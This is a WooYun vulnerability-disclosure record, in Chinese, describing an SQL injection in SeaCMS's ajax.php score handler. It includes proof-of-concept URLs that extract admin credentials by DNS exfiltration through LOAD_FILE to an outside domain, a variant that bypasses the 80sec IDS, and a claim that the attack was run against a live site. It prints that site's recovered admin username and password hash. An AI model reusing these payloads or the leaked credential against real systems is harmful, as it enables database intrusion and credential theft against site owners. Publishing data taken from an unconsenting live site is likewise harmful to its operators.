{"id": 87929, "wybug_id": "wooyun-2016-0185538", "wybug_title": "Seacms最新版多处update注入(绕过360webscan)                                      ", "wybug_corp": "SeaCms", "wybug_author": "Pany自留地", "wybug_date": "2016-03-18 15:50", "wybug_open_date": "2016-06-20 15:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "源码分析", "绕过"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-25：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-20：\t细节向公众公开  简要描述： update注入一枚，通过dns直接获取敏感信息。版本:V6.23同时绕过80sec ids,360webscan 详细说明：  SeaCms有一个类似全局注册变量的机制，为后面的漏洞埋下了伏笔\n//检查和注册外部提交的变量foreach($_REQUEST as $_k=>$_v){\tif( strlen($_k)>0 && m_eregi('^(cfg_|GLOBALS)',$_k) && !isset($_COOKIE[$_k]) )\t{\t\texit('Request var not allow!');\t}}function _RunMagicQuotes(&$svar){\tif(!get_magic_quotes_gpc())\t{\t\tif( is_array($svar) )\t\t{\t\t\tforeach($svar as $_k => $_v) $svar[$_k] = _RunMagicQuotes($_v);\t\t}\t\telse\t\t{\t\t\t$svar = addslashes($svar);\t\t}\t}\treturn $svar;}foreach(Array('_GET','_POST','_COOKIE') as $_request){\tforeach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);}\n漏洞文件：\\include\\ajax.php11-44行\nswitch ($action) {\tcase \"digg\":\tcase \"tread\":\tcase \"score\":\t\techo scoreVideo($action);\tbreak;\tcase \"diggnews\":\tcase \"treadnews\":\tcase \"scorenews\":\t\techo scoreNews($action);\tbreak;\tcase \"hit\":\t\techo updateHit();\tbreak;\tcase \"hitnews\":\t\techo updateHitNews();\tbreak;\tcase \"addfav\":\t\techo addfav();\tbreak;\tcase \"videoscore\":\tcase \"newsscore\":\t\techo getScore($action);\tbreak;\tcase \"vpingfen\":\t\techo vpingfen($action);\tbreak;\tcase \"npingfen\":\t\techo npingfen($action);\tbreak;\tcase \"member\":\t\techo member();\tbreak;}\n问题出在了scoreVideo()函数，跟进这个函数\nfunction scoreVideo($operType){\tglobal $id,$dsql,$score;\tif($id < 1) return \"err\";\t.......此处省略几行代码..........\t}elseif($operType==\"score\"){\t\tif(GetCookie(\"ssea3_score\".$id)==\"ok\") return \"havescore\";\t\t$dsql->ExecuteNoneQuery(\"Update `sea_data` set v_scorenum=v_scorenum+1,v_score=v_score+\".$score.\" where v_id=$id\");\t\tPutCookie(\"ssea3_score\".$id,\"ok\",3600 * 24,'/');\t\treturn '';\t}else{\t\treturn \"err\";\t}}\n$dsql->ExecuteNoneQuery(\"Update `sea_data` set v_scorenum=v_scorenum+1,v_score=v_score+\".$score.\" where v_id=$id\");$id和$score都可以控，造成了SQL注入。当\n$score=2,v_digg=(select user())\n的时候，意外的把字段v_digg的内容利用子查询更新成工具者想获取的信息接下来编写poc首先理清程序的逻辑$action=score 才能进入scoreVideo()这个函数同时$id要大于1，否则 return \"err\";Cookie中ssea3_score.$id的值不能为ok，否则 return \"havescore\";因为无法直接获取子查询的数据，这里我使用DNS来获取数据（这个方法的局限性是目标环境要使用root用户连接的数据库才能获取到数据）参考《在SQL注入中使用DNS获取数据》http://**.**.**.**/tips/5283理论上poc为:\nhttp://localhost/include/ajax.php?action=score&id=1&score=2,v_digg=(SELECT%20LOAD_FILE(CONCAT(0x5c5c5c5c,(select%20concat_ws(0x5f,name,password)%20from%20sea_admin%20limit%201),0x2e33633866396633646330633032363538356261303131326633316335353632632e776f6f79756e2e67715c5c5c5c666f6f626172)))\n但是由于程序使用了80sec的ids。绕过后的POC：\nhttp://localhost/include/ajax.php?action=score&id=1&score=@`\\'`,v_digg=(SELECT%20LOAD_FILE(CONCAT(0x5c5c5c5c,(select%20concat_ws(0x5f,name,password)%20from%20sea_admin%20limit%201),0x2e33633866396633646330633032363538356261303131326633316335353632632e776f6f79756e2e67715c5c5c5c666f6f626172))),v_hit=@`\\'`\n在本地调试的时候，360webscan不会进行拦截，但在实际线上环境中，上面的poc是会被360webscan拦截的。\n\n因此还得绕过360webscan(最终poc在测试代码中)   漏洞证明：  找了一个线上环境：http://**.**.**.**/dns获取到的\n\n用户：mosss   密码：78832884f6c8c932a264Seacms的加密方式和dedecms都是20位的md5，要还原密码得前减3位后减1位，得到16位MD5\n\n   修复方案：  sql参数化查询可以做到根本上解决这类的问题。   版权声明：转载请注明来源 Pany自留地@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-03-22 15:49 厂商回复： CNVD未直接复现所述情况，暂未建立与网站管理单位的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-18 17:29 |    \t\tDeadSea \t\t\t( 普通白帽子  |\t\t\t        Rank:284 漏洞数:63        | 本人外形俊朗、眉清目秀、玉树临风、有明星...)\t\t \n  何必呢？兄弟。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}